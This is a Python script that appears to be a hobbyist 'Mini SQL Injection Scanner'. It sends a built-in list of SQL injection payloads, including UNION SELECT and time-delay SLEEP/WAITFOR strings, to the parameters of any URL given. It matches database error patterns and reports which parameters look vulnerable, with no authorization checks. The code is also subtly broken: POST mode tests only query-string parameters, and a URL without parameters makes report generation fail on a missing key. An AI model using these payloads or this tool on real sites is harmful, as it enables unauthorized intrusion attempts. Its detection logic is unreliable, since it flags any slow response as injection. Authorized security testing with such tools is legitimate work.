#!/usr/bin/env python3

import requests
import argparse
import sys
import time
import urllib.parse
from typing import List, Dict, Optional
import concurrent.futures
import threading

class SQLInjectionScanner:
    def __init__(self, timeout: int = 10, threads: int = 5):
        self.timeout = timeout
        self.threads = threads
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Common SQL injection payloads
        self.payloads = [
            "'",
            "''",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR '1'='1--",
            "') OR ('1'='1--",
            "1' OR '1'='1",
            "1' OR 1 -- -",
            "1' OR 1=1--",
            "1' OR 1=1#",
            "1' OR 1=1/*",
            "1' UNION SELECT NULL--",
            "1' AND (SELECT COUNT(*) FROM users) > 0--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "'; WAITFOR DELAY '0:0:5'--",
            "'; WAITFOR DELAY '0:0:10'--",
            "' OR SLEEP(5)--",
            "' OR SLEEP(10)--",
            "1' OR SLEEP(5)--",
            "1' OR SLEEP(10)--",
            "' OR pg_sleep(5)--",
            "' OR pg_sleep(10)--",
            "'; SELECT pg_sleep(5)--",
            "'; SELECT pg_sleep(10)--"
        ]
        
        # SQL error patterns to detect
        self.error_patterns = [
            # MySQL
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            # MS SQL Server
            r"Driver.* SQL.*Server",
            r"OLE DB.* SQL Server",
            r"(\W|\A)SQL.*Server.*Driver",
            r"Warning.*mssql_.*",
            r"(\W|\A)SQL.*Server.*[0-9a-fA-F]{8}",
            r"Exception.*Oracle",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*oci_.*",
            r"Warning.*ora_.*",
            # IBM DB2
            r"CLI Driver.*DB2",
            r"DB2 SQL error",
            r"(\W|\A)db2_.*",
            # SQLite
            r"SQLite/JDBCDriver",
            r"SQLite.*Driver",
            r"Warning.*sqlite_.*",
            r"Warning.*SQLite3::",
            r"\[SQLite_ERROR\]",
            # Generic SQL
            r"SQL.*Driver",
            r"SQL.*ERROR",
            r"SQL.*Warning",
            r"SQL.*Exception",
            r"error.*SQL.*syntax",
            r"Unknown column",
            r"Unknown table",
            r"Invalid SQL",
            r"SQL injection",
            r"database error",
            r"db error",
            r"sql error"
        ]
        
        self.vulnerabilities = []
        self.lock = threading.Lock()
    
    def test_parameter(self, url: str, param: str, method: str = 'GET') -> Dict:
        """Test a single parameter for SQL injection vulnerabilities"""
        results = {
            'parameter': param,
            'vulnerable': False,
            'payloads_tested': [],
            'errors_found': [],
            'response_times': []
        }
        
        for payload in self.payloads:
            try:
                start_time = time.time()
                
                if method.upper() == 'GET':
                    # Test with GET parameter
                    test_url = f"{url}{'&' if '?' in url else '?'}{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=self.timeout)
                else:
                    # Test with POST parameter
                    data = {param: payload}
                    response = self.session.post(url, data=data, timeout=self.timeout)
                
                response_time = time.time() - start_time
                results['response_times'].append(response_time)
                
                # Check for SQL errors in response
                response_text = response.text.lower()
                for pattern in self.error_patterns:
                    import re
                    if re.search(pattern, response_text, re.IGNORECASE):
                        results['errors_found'].append({
                            'payload': payload,
                            'error_pattern': pattern,
                            'response_time': response_time
                        })
                        results['vulnerable'] = True
                
                # Check for time-based blind SQL injection
                if response_time > 5:  # If response took more than 5 seconds
                    results['errors_found'].append({
                        'payload': payload,
                        'error_pattern': 'Time-based blind SQL injection (response time > 5s)',
                        'response_time': response_time
                    })
                    results['vulnerable'] = True
                
                results['payloads_tested'].append(payload)
                
            except requests.exceptions.RequestException as e:
                continue
        
        return results
    
    def extract_parameters(self, url: str) -> List[str]:
        """Extract parameters from URL"""
        parsed_url = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed_url.query)
        return list(params.keys())
    
    def scan_url(self, url: str, method: str = 'GET') -> Dict:
        """Scan a URL for SQL injection vulnerabilities"""
        print(f"[*] Scanning URL: {url}")
        
        # Extract parameters from URL
        parameters = self.extract_parameters(url)
        
        if not parameters:
            print("[!] No parameters found in URL")
            return {'url': url, 'parameters_tested': [], 'vulnerable': False}
        
        print(f"[*] Found {len(parameters)} parameter(s): {', '.join(parameters)}")
        
        results = {
            'url': url,
            'method': method,
            'parameters_tested': [],
            'vulnerable': False,
            'vulnerable_parameters': []
        }
        
        # Test each parameter
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_param = {
                executor.submit(self.test_parameter, url, param, method): param 
                for param in parameters
            }
            
            for future in concurrent.futures.as_completed(future_to_param):
                param = future_to_param[future]
                try:
                    param_result = future.result()
                    results['parameters_tested'].append(param_result)
                    
                    if param_result['vulnerable']:
                        results['vulnerable'] = True
                        results['vulnerable_parameters'].append(param)
                        with self.lock:
                            self.vulnerabilities.append({
                                'url': url,
                                'parameter': param,
                                'method': method
                            })
                except Exception as e:
                    print(f"[!] Error testing parameter {param}: {str(e)}")
        
        return results
    
    def generate_report(self, results: Dict) -> str:
        """Generate a detailed report of the scan results"""
        report = []
        report.append("=" * 60)
        report.append("SQL INJECTION VULNERABILITY SCAN REPORT")
        report.append("=" * 60)
        report.append(f"URL: {results['url']}")
        report.append(f"Method: {results['method']}")
        report.append(f"Scan Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        report.append("-" * 60)
        
        if results['vulnerable']:
            report.append("[!] VULNERABILITIES FOUND!")
            report.append(f"Vulnerable Parameters: {', '.join(results['vulnerable_parameters'])}")
            report.append("")
            
            for param_result in results['parameters_tested']:
                if param_result['vulnerable']:
                    report.append(f"Parameter: {param_result['parameter']}")
                    report.append("Status: VULNERABLE")
                    report.append("Errors Found:")
                    for error in param_result['errors_found']:
                        report.append(f"  - Payload: {error['payload']}")
                        report.append(f"    Error: {error['error_pattern']}")
                        report.append(f"    Response Time: {error['response_time']:.2f}s")
                    report.append("-" * 40)
        else:
            report.append("[+] No SQL injection vulnerabilities detected")
        
        return "\n".join(report)
    
    def save_report(self, results: Dict, filename: str = None):
        """Save scan results to file"""
        if not filename:
            filename = f"sqliscan_report_{int(time.time())}.txt"
        
        report = self.generate_report(results)
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(report)
        
        print(f"[*] Report saved to: {filename}")

def main():
    parser = argparse.ArgumentParser(
        description='Mini SQL Injection Vulnerability Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 main.py -u "http://example.com/page?id=1"
  python3 main.py -u "http://example.com/login" -m POST
  python3 main.py -u "http://example.com/search?q=test" -t 10
  python3 main.py -u "http://example.com/page?id=1" -o report.txt
        """
    )
    
    parser.add_argument('-u', '--url', required=True, 
                       help='Target URL to scan')
    parser.add_argument('-m', '--method', choices=['GET', 'POST'], 
                       default='GET', help='HTTP method (default: GET)')
    parser.add_argument('-t', '--threads', type=int, default=5,
                       help='Number of threads (default: 5)')
    parser.add_argument('-T', '--timeout', type=int, default=10,
                       help='Request timeout in seconds (default: 10)')
    parser.add_argument('-o', '--output', 
                       help='Output file for scan results')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Enable verbose output')
    
    args = parser.parse_args()
    
    if not args.url.startswith(('http://', 'https://')):
        print("[!] Error: URL must start with http:// or https://")
        sys.exit(1)
    
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║                  Mini SQL Injection Scanner                  ║
    ║                          Version 1.0                         ║
    ║                     Code By HadsXdevCate                     ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    
    # Initialize scanner
    scanner = SQLInjectionScanner(
        timeout=args.timeout,
        threads=args.threads
    )
    
    try:
        # Start scanning
        results = scanner.scan_url(args.url, args.method)
        
        # Generate and display report
        report = scanner.generate_report(results)
        print("\n" + report)
        
        # Save report if output file specified
        if args.output:
            scanner.save_report(results, args.output)
        
        # Exit with appropriate code
        sys.exit(1 if results['vulnerable'] else 0)
        
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error during scan: {str(e)}")
        sys.exit(1)

if __name__ == '__main__':
    main()